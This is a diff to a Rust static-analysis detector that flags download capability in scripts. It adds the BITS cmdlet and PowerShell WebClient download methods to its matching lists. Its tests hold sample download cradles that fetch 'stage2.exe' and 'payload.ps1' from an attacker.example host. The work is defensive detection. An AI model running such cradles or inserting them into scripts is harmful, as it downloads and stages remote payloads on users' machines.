@@ -39,7 +39,15 @@ const SCRIPT_DOWNLOAD_COMMAND_TOKENS: &[&str] = &[
     "iwr",
     "invoke-restmethod",
     "irm",
+    "start-bitstransfer",
 ];
+
+/// PowerShell .NET `WebClient` download methods. These are dotted method
+/// calls (`$wc.DownloadFile(`), so the `.` defeats the word-boundary
+/// [`line_contains_command_token`] matcher; match the `.method(` form
+/// directly so a WebClient cradle raises the download capability/relation.
+const SCRIPT_DOTTED_DOWNLOAD_METHODS: &[&str] =
+    &[".downloadstring(", ".downloadfile(", ".downloaddata("];
 
 /// Strip inline `#` comments from `content` for the languages in
 /// [`HASH_COMMENT_LANGUAGES`], preserving line structure (line count
@@ -594,6 +602,9 @@ fn line_contains_download_command(line: &str) -> bool {
     SCRIPT_DOWNLOAD_COMMAND_TOKENS
         .iter()
         .any(|token| line_contains_command_token(line, token))
+        || SCRIPT_DOTTED_DOWNLOAD_METHODS
+            .iter()
+            .any(|method| line.contains(method))
 }
 
 fn line_contains_package_install_command(line: &str) -> bool {
@@ -652,6 +663,42 @@ mod tests {
                 "process-exec idiom must raise ProcessExecution for {content:?}",
             );
         }
+    }
+
+    /// Contract: a PowerShell WebClient/BITS download cradle produces the
+    /// Downloads relation (and NetworkAccess) so the download->exec composite
+    /// forms. The dotted `.DownloadFile(` method and `Start-BitsTransfer`
+    /// cmdlet evaded the cmdlet/alias-only download-token list.
+    #[test]
+    fn script_download_detects_powershell_webclient_and_bits() {
+        for content in [
+            "(New-Object Net.WebClient).DownloadFile('http://attacker.example/stage2.exe', \"$env:TEMP\\s.exe\")\n",
+            "$wc.DownloadString('https://attacker.example/payload.ps1')\n",
+            "Start-BitsTransfer -Source files/x.exe -Destination s.exe\n",
+        ] {
+            assert!(
+                relation_target_present(&script_relations(content), "remote-resource"),
+                "WebClient/BITS download must produce a Downloads relation for {content:?}",
+            );
+            assert!(
+                capability_present(
+                    &script_capabilities(content),
+                    ArtifactCapability::NetworkAccess
+                ),
+                "WebClient/BITS download must raise NetworkAccess for {content:?}",
+            );
+        }
+    }
+
+    /// Contract (negative): a benign identifier containing a download-method
+    /// substring without the `.method(` call shape must not raise Downloads.
+    #[test]
+    fn script_download_rejects_method_name_substrings() {
+        let content = "let downloadfile_path = config.downloadfile_dir;\n";
+        assert!(
+            !relation_target_present(&script_relations(content), "remote-resource"),
+            "a bare identifier must not be read as a download call",
+        );
     }
 
     /// Contract (negative): ordinary words that merely contain an exec-idiom
